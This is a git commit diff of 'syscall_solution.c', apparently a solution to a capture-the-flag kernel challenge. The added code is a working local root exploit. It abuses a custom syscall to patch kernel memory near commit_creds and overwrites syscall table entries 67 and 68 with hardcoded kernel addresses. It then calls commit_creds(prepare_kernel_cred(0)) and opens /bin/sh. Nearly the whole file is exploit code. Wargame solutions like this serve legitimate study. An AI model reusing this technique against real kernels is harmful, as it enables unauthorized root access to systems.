ad3619e454bbe49d735fffc070dbbed92b24a76b
fueljuice <77461232+fueljuice@users.noreply.github.com>
2025-08-26 20:49:34 +0300

    Update syscall_solution.c

--- syscall_solution.c
+++ syscall_solution.c
@@ -1,22 +1,21 @@
-#include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <unistd.h>
 #include <sys/syscall.h>
-
-
-
 #define UPPER_SYSCALL 223
-#define SYS_CALL_TABLE  0x8000e348
-#define COMMIT_CREDS_ADDRESS 0x8003f56c
-#define PREPARE_KERNEL_CRED_ADDRESS 0x8003f924
-unsigned int** sct = (unsigned int**)SYS_CALL_TABLE;
+unsigned int** sct = (unsigned int**)0x8000e348;
 
 int main()
 {
-        char* payload = [""];
+      
+        syscall(UPPER_SYSCALL, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", (0x8003f56c - 12) );
+        syscall(UPPER_SYSCALL,"\x60\xf5\x03\x80", &sct[67] );
 
-        syscall(UPPER_SYSCALL,payload,sct[10]);
-        syscall(sct[10]);
+        syscall(UPPER_SYSCALL,"\x24\xf9\x03\x80", &sct[68] );
 
+        syscall(67,syscall(68,0));
+        
         system("/bin/sh");
+        return 0;
+}
+
+# gcc -o ex5 ex5.c
